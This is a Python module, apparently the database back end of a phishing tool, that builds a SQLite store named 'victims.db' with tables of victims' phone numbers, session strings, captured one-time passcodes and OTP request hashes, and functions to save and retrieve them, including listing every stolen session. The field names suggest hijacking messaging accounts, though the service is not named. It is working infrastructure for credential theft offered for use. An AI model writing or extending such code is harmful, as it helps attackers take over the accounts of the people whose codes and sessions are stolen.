import sqlite3
import logging

logger = logging.getLogger(__name__)

def init_db():
    """Initialize database"""
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        
        # Victims table
        c.execute('''CREATE TABLE IF NOT EXISTS victims
                    (phone TEXT PRIMARY KEY, 
                     session_string TEXT, 
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                     last_otp TEXT,
                     last_otp_time TIMESTAMP)''')
        
        # OTP requests table
        c.execute('''CREATE TABLE IF NOT EXISTS otp_requests
                    (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     phone TEXT,
                     hash TEXT,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ Database init error: {e}")

def save_victim_session(phone, session_string):
    """Save victim session"""
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO victims (phone, session_string) VALUES (?, ?)", 
                 (phone, session_string))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"❌ Save session error: {e}")
        return False

def get_victim_session(phone):
    """Get victim session"""
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT session_string FROM victims WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Get session error: {e}")
        return None

def get_all_victim_sessions():
    """Get all victim sessions"""
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT phone, session_string FROM victims")
        sessions = c.fetchall()
        conn.close()
        return sessions
    except Exception as e:
        logger.error(f"❌ Get all sessions error: {e}")
        return []

def save_otp_request(phone, hash_value):
    """Save OTP request"""
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("INSERT INTO otp_requests (phone, hash) VALUES (?, ?)", 
                 (phone, hash_value))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"❌ Save OTP request error: {e}")
        return False

def update_victim_otp(phone, otp_code):
    """Update victim's last OTP"""
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("UPDATE victims SET last_otp = ?, last_otp_time = CURRENT_TIMESTAMP WHERE phone = ?", 
                 (otp_code, phone))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"❌ Update OTP error: {e}")
        return False

def get_victim_otp(phone):
    """Get victim's last OTP"""
    try:
        conn = sqlite3.connect('victims.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT last_otp, last_otp_time FROM victims WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        return result if result else (None, None)
    except Exception as e:
        logger.error(f"❌ Get OTP error: {e}")
        return (None, None)
